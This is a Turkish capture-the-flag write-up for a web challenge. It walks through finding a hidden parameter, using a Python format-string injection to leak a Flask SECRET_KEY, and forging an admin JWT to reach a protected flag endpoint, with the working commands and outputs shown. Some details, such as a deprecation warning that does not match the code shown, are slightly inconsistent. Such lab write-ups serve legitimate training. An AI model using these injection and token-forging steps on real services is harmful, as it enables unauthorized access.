# 🌐 Selam - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge&logo=firefox" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Zor-darkred?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Format_String-purple?style=for-the-badge&logo=python" alt="Format String">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 600

**Açıklama:** Selam format atmayı biliyor musun?
              Agresif araçlara hiç ama hiç gerek yok! Ama arjun birazcık şart gibi :)

**Challenge URL:** http://64.226.74.243:28054/


---

## 💡 İpuçları

### **Hint 1:**
```
arjun -u site -->yeterli jwt keyi brute atarak bulamazsınız.
```

### **Hint 2:**
```
Tek çözüm Format!
```

### **Hint 3:**
```
{Python string formatting } Bazı dizinlerim gizli. Brute atmadan bulabilirsiniz. 
Biraz düşünmeniz lazım.
```

### **Hint 4:**
```
Arjundan bulduğun parametre ile config'e ulaş!
```

### **Hint 5:**
```
İpucu crypto mesaj sorusunda
```

### **Hint 6:**
```
https://drive.google.com/file/d/1NAIxhWtEiCbClpKGjgop2yRoPNvSgqPv/view?usp=drivesdk
```

> 🎯 **İpucu Analizi:**
> - "arjun birazcık şart" → Arjun ile parameter keşfedilecek
> - "jwt keyi brute atarak bulamazsınız" → Brute force çalışmayacak
> - "Tek çözüm Format!" → Format string vulnerability kullanılacak
> - "{Python string formatting}" → Python .format() kullanılıyor
> - "Bazı dizinlerim gizli" → robots.txt'te endpoint'ler var
> - "Arjundan bulduğun parametre ile config'e ulaş!" → Parameter ile config erişimi
> - "İpucu crypto mesaj sorusunda" → Crypto sorusundaki hint bu challenge için
>    - Google Drive linki → robot fotoğrafı var (robots.txt dosyasını kontrol et!)

---

## 🔍 Analiz

### Challenge Özeti

**Hedef:** Flask web uygulamasında Python format string vulnerability kullanarak SECRET_KEY elde edip admin JWT token ile flag almak

**Verilen Bilgiler:**
- URL: http://64.226.74.243:28054/
- Hint: Arjun kullanılacak
- Hint: Format string vulnerability var
- Hint: Crypto sorusunda ipucu var
- Hint: robots.txt'te gizli endpoint'ler var

---

## ✅ Çözüm Adımları

### 🌐 **1. İlk Keşif**

**Web sitesini ziyaret ediyoruz:**

```bash
curl http://64.226.74.243:28054/
```

**Çıktı:**
```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Selam</title>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Selam</h1>
            <p>Saçma Sapan Bir Site</p>
        </div>
        
        <div class="content">
            <div class="greeting">Merhaba, . İyi günler dileriz!</div>
            
            <div class="card">
                <p>Tek işlevi seni selamlamak.</p>
            </div>
        </div>
    </div>
</body>
</html>
```

**Analiz:**
- 📄 Ana sayfada bir greeting mesajı var
- 🔍 `Merhaba, .` → Buraya virgülden sonra  bir parametre render ediliyor olabilir
- 🤔 Hangi parametre kullanılıyor?

> 💡 Input render ediliyor - format string vulnerability olabilir!

---

### 📍 **2. robots.txt Kontrolü**

**Hint'ten:** Son hint'teki Google Drive linkinde robots.txt fotoğrafı var → robots.txt dosyasını kontrol etmeliyiz!

```bash
curl http://64.226.74.243:28054/robots.txt
```

**Çıktı:**
```
User-agent: *
Disallow: /flag
Disallow: /whoami
```

**Keşfedilen endpoint'ler:**
- 📍 `/flag` → Ana hedefimiz!
- 📍 `/whoami` → JWT token bilgisi veriyor olabilir

> 🎯 Flag endpoint'i bulundu - ama erişim için muhtemelen authentication gerekiyor!

**Hint analizi:**
- 🖼️ Drive linkindeki robots.txt fotoğrafı → "robots.txt dosyasına bak" demek
- 🔍 "Bazı dizinlerim gizli. Brute atmadan bulabilirsiniz." → robots.txt'te gizli endpoint'ler vardı!
- ✅ Brute force yapmadan `/flag` ve `/whoami` bulundu

---

### 🔐 **3. /whoami Endpoint İncelemesi**

```bash
curl http://64.226.74.243:28054/whoami
```

**Çıktı:**
```json
{"exp":1768589620,"role":"user"}
```

**Analiz:**
- 🔓 JWT token decode edilmiş halde dönüyor
- 👤 `role: user` → Bizim admin olmamız gerekiyor!
- ⏰ `exp` → Token expiration time
- 💡 SECRET_KEY bulursak admin token oluşturabiliriz!

> 🔑 JWT authentication kullanılıyor - SECRET_KEY'e ihtiyacımız var!

**Hint analizi:**
- ⚠️ "jwt keyi brute atarak bulamazsınız" → Brute force çalışmayacak
- 🎯 Başka bir yöntemle SECRET_KEY bulmalıyız

---

### 🔧 **4. Parameter Discovery - Arjun**

**Hint'ten:** "arjun -u site -->yeterli"

```bash
arjun -u http://64.226.74.243:28054/
```

**Çıktı:**
```
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/

[*] Probing the URL
[*] Scanning: http://64.226.74.243:28054/
[+] Valid parameter found: user
```

> ✅ **user** parametresi bulundu!

**Hint analizi:**
- ✅ "Ama arjun birazcık şart gibi :)" → Arjun kullanmamız gerekiyordu
- ✅ "Arjundan bulduğun parametre ile config'e ulaş!" → `user` parametresiyle config'e erişeceğiz

---

### 🎯 **5. user Parametresi Testi**

**Basit test:**

```bash
curl 'http://64.226.74.243:28054/?user=test'
```

**Çıktı:**
```html
<div class="greeting">Merhaba, test. İyi günler dileriz!</div>
```

**Analiz:**
- ✅ `user` parametresi greeting mesajına ekleniyor
- 📝 Input'umuz direkt render ediliyor
- 🤔 Format string vulnerability var mı?

> 💡 User input direkt render ediliyor - format string deneyebiliriz!

---

### 💥 **6. Format String Vulnerability Testi**

**Hint'ten:** "Tek çözüm Format!" ve "{Python string formatting}"

**Python format string syntax'ları:**

```bash
# Index-based format string
curl 'http://64.226.74.243:28054/?user={0}'
curl 'http://64.226.74.243:28054/?user={1}'
curl 'http://64.226.74.243:28054/?user={2}'
```

**Çıktı:**
```html
Merhaba, {0}. İyi günler dileriz!
Merhaba, {1}. İyi günler dileriz!
Merhaba, {2}. İyi günler dileriz!
```

**Analiz:**
- ❌ Süslü parantezler literal olarak basılıyor
- ❌ Değerlendirilmiyor (evaluate)
- 🤔 Belki farklı bir syntax gerekiyor?

> 💭 Index-based format string çalışmıyor - başka bir yöntem denemeliyiz!

---

### 🔓 **7. Crypto İpucunu Hatırlayalım**

**Hint'ten:** "İpucu crypto mesaj sorusunda"

**Crypto sorusunu çözdüğümüzde aldığımız flag:**
```
FLAG{IYITATILLERPORTSWIGGERLABSONSELAMSORUSUNASUSLUPARANTEZLERLECONFIGGONDER}
```

**Flag'in okunabilir hali:**
```
IYI TATILLER PORT SWIGGER LAB SON SELAM SORUSUNA 
SUSLU PARANTEZLERLE CONFIG GONDER
```

**Anahtar kelimeler:**
- **SUSLU PARANTEZLERLE** → `{}`
- **CONFIG GONDER** → Config objesini render etmeliyiz!
- **SON SELAM SORUSU** → Bu challenge!
- **Python format string** hint'inden → Keyword arguments kullanmalıyız

> 🎯 Crypto sorusundaki flag direkt bu challenge'a işaret ediyor - config'i süslü parantezle göndermeliyiz!

---

### 🧪 **8. Attribute Access Denemeleri**

**Farklı format string syntax'ları deniyoruz:**

```bash
# Attribute access
curl 'http://64.226.74.243:28054/?user={0.__class__}'
curl 'http://64.226.74.243:28054/?user={0.__dict__}'

# Keyword arguments
curl 'http://64.226.74.243:28054/?user={config}'
curl 'http://64.226.74.243:28054/?user={secret}'
curl 'http://64.226.74.243:28054/?user={key}'
```

**Çıktı:**
```html
Merhaba, {0.__class__}. İyi günler dileriz!
Merhaba, {config}. İyi günler dileriz!
Merhaba, {secret}. İyi günler dileriz!
```

**Analiz:**
- ❌ Hiçbiri çalışmıyor
- ❌ Literal olarak basılıyor
- 🤔 URL encoding denememiz gerekebilir

> 💡 Normal syntax çalışmıyor - belki URL encoding ile bypass edebiliriz!

---

### 🎯 **9. URL Encoding ile CONFIG Erişimi**

**URL-encoded format string kullanıyoruz:**

```bash
# { = %7B
# } = %7D

# URL encoded: {CONFIG}
curl 'http://64.226.74.243:28054/?user=%7BCONFIG%7D'
```

**Çıktı:**
```
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.</p>
```

> 🔥 **500 ERROR ALDI!** Bu çok iyi bir işaret - server config objesi render etmeye çalışıyor!

---

### 💎 **10. Doğru Değişken Adı ile SECRET_KEY Bulma**

**Farklı değişken isimleri deniyoruz:**

```bash
# URL encoded: {SECRET_KEY}
curl 'http://64.226.74.243:28054/?user=%7BSECRET_KEY%7D'
```

**BINGO! Çıktı:**
```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selam</title>
    <style>
        /* CSS stilleri */
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Selam</h1>
            <p>Saçma Sapan Bir Site</p>
        </div>
        
        <div class="content">
            <div class="greeting">Merhaba, {'DATE': '2026-01-15 10:20:46', 
'APP_NAME': 'Selam', 
'SECRET_KEY': '807c137d7324af1721f7108aca3872752cd894370e79e2f81d97b6d72d0b861d', 
'GREETING': 'Merhaba, '}. İyi günler dileriz!</div>
            
            <div class="card">
                <p>Tek işlevi seni selamlamak.</p>
            </div>
        </div>
        
        <div class="footer">
            <p>&copy; 2026-01-15 PitoEdubounty. Tüm hakları saklıdır.</p>
        </div>
    </div>
</body>
</html>
```

> 🚩 **SECRET_KEY BULUNDU!**

```
SECRET_KEY: 807c137d7324af1721f7108aca3872752cd894370e79e2f81d97b6d72d0b861d
```

**Elde edilen bilgiler:**
- 📅 **DATE:** 2026-01-15 10:20:46
- 📛 **APP_NAME:** Selam
- 🔑 **SECRET_KEY:** 807c137d7324af1721f7108aca3872752cd894370e79e2f81d97b6d72d0b861d
- 👋 **GREETING:** Merhaba,

> 🎉 Format string vulnerability başarıyla exploit edildi!

**Hint analizi:**
- ✅ "Arjundan bulduğun parametre ile config'e ulaş!" → `user` parametresi ile config'e ulaştık
- ✅ "SUSLU PARANTEZLERLE CONFIG GONDER" → `{SECRET_KEY}` ile config render ettik

---

### 🔐 **11. Admin JWT Token Oluşturma**

**PyJWT kütüphanesini kuruyoruz:**

```bash
pip3 install pyjwt
```

**Python ile admin rolünde token oluşturuyoruz:**

```python
python3 << 'EOF'
import jwt
import datetime

SECRET_KEY = '807c137d7324af1721f7108aca3872752cd894370e79e2f81d97b6d72d0b861d'

# Admin rolünde payload oluştur
payload = {
    'role': 'admin',
    'exp': datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1)
}

# Token oluştur
token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
print(token)
EOF
```

**Çıktı:**
```
<stdin>:9: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJleHAiOjE3Njg1OTA5ODN9.QC5Lum4vdE1nZtaA0ndI-FiMIRPSzjx0YLLTPWvKjmI
```

**Token breakdown:**
```
Header:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
         {"alg":"HS256","typ":"JWT"}

Payload: eyJyb2xlIjoiYWRtaW4iLCJleHAiOjE3Njg1OTA5ODN9
         {"role":"admin","exp":1768590983}

Signature: QC5Lum4vdE1nZtaA0ndI-FiMIRPSzjx0YLLTPWvKjmI
```

> ✅ Admin JWT token başarıyla oluşturuldu!

---

### 🎯 **12. Flag Endpoint'ine Erişim**

**İlk deneme - Authorization header ile:**

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJleHAiOjE3Njg1OTA5ODN9.QC5Lum4vdE1nZtaA0ndI-FiMIRPSzjx0YLLTPWvKjmI" \
     http://64.226.74.243:28054/flag
```

**Çıktı:**
```json
{"message":"Token bulunamadı!"}
```

**Analiz:**
- ❌ Authorization header çalışmıyor
- 🤔 `/whoami` endpoint'i cookie kullanıyor olmalı
- 🍪 Token'ı cookie olarak göndermeliyiz

> 💡 Token header'da değil, cookie'de olmalı!

---

**İkinci deneme - Cookie ile:**

```bash
curl -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJleHAiOjE3Njg1OTA5ODN9.QC5Lum4vdE1nZtaA0ndI-FiMIRPSzjx0YLLTPWvKjmI" \
     http://64.226.74.243:28054/flag
```

**BAŞARILI! Çıktı:**
```
BayrakBende{t3k_c0zum_f0rm4t_k4rdo_demisler_oylemi3827487234}
```

> 🎉 **FLAG BULUNDU!** Challenge tamamlandı!

---

## 🚩 **FLAG**

```
BayrakBende{t3k_c0zum_f0rm4t_k4rdo_demisler_oylemi3827487234}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔧<br><b>Arjun</b><br><sub>Parameter discovery</sub></td>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">🐍<br><b>Python</b><br><sub>JWT encoding</sub></td>
<td align="center">🔐<br><b>PyJWT</b><br><sub>Token manipulation</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# İlk keşif
curl http://64.226.74.243:28054/

# robots.txt kontrolü (hint'ten)
curl http://64.226.74.243:28054/robots.txt

# /whoami endpoint
curl http://64.226.74.243:28054/whoami

# Parameter discovery (hint: "arjun birazcık şart")
arjun -u http://64.226.74.243:28054/

# Format string testing
curl 'http://64.226.74.243:28054/?user=test'
curl 'http://64.226.74.243:28054/?user={0}'
curl 'http://64.226.74.243:28054/?user={config}'

# SECRET_KEY extraction (hint: "SUSLU PARANTEZLERLE CONFIG")
curl 'http://64.226.74.243:28054/?user=%7BCONFIG%7D'
curl 'http://64.226.74.243:28054/?user=%7BSECRET_KEY%7D'

# Admin JWT token oluşturma
pip3 install pyjwt
python3 << 'EOF'
import jwt
import datetime
SECRET_KEY = '807c137d7324af1721f7108aca3872752cd894370e79e2f81d97b6d72d0b861d'
payload = {'role': 'admin', 'exp': datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1)}
token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
print(token)
EOF

# Flag alma (Authorization header - BAŞARISIZ)
curl -H "Authorization: Bearer TOKEN" http://64.226.74.243:28054/flag

# Flag alma (Cookie - BAŞARILI)
curl -b "token=TOKEN" http://64.226.74.243:28054/flag
```

---

## 💭 **Çözüm Akış Şeması**

```
🌐 Web Challenge: "Selam"
            ↓
📝 Hint'leri Oku
   - "arjun birazcık şart"
   - "Tek çözüm Format!"
   - "İpucu crypto mesaj sorusunda"
   - Google Drive: robots.txt fotoğrafı
            ↓
📍 İlk keşif
   → Ana sayfa: "Merhaba, [nokta]"
            ↓
🖼️ Hint analizi
   → Google Drive: robots.txt fotoğrafı
   → "robots.txt dosyasına bak" demek!
            ↓
📄 robots.txt kontrolü
   → /flag bulundu
   → /whoami bulundu
   → "Brute atmadan bulabilirsiniz" ✅
            ↓
🔐 /whoami endpoint
   → JWT token: {"role":"user"}
   → Admin olmamız gerekiyor!
   → Hint: "jwt keyi brute atarak bulamazsınız"
            ↓
🔧 Arjun parameter discovery
   → Hint: "arjun birazcık şart gibi"
   → user parametresi bulundu
            ↓
🎯 user=test
   → Input render ediliyor
   → Hint: "Tek çözüm Format!"
            ↓
💥 Format string testleri
   → user={0} → Literal basıyor
   → user={config} → Literal basıyor
   → Hint: "{Python string formatting}"
            ↓
💡 Crypto hint analizi
   → Hint: "İpucu crypto mesaj sorusunda"
   → Crypto sorusunun flag'i: "IYITATILLER...CONFIGGONDER"
   → "SUSLU PARANTEZLERLE CONFIG GONDER"
   → Bu challenge'a işaret ediyor!
            ↓
🔓 URL encoding denemesi
   → user=%7BCONFIG%7D → 500 Error!
   → Server config render etmeye çalışıyor
            ↓
💎 Doğru değişken adı
   → user=%7BSECRET_KEY%7D
   → Config dictionary render edildi!
   → Hint: "Arjundan bulduğun parametre ile config'e ulaş!" ✅
            ↓
🔑 SECRET_KEY bulundu
   → 807c137d7324af1721f7108aca3872752cd894370e79e2f81d97b6d72d0b861d
            ↓
🔐 PyJWT ile admin token
   → payload: {"role":"admin"}
   → Token oluşturuldu
            ↓
🍪 Cookie authentication
   → Authorization header çalışmadı
   → Cookie ile başarılı!
            ↓
🚩 BayrakBende{t3k_c0zum_f0rm4t_k4rdo_demisler_oylemi3827487234}
```
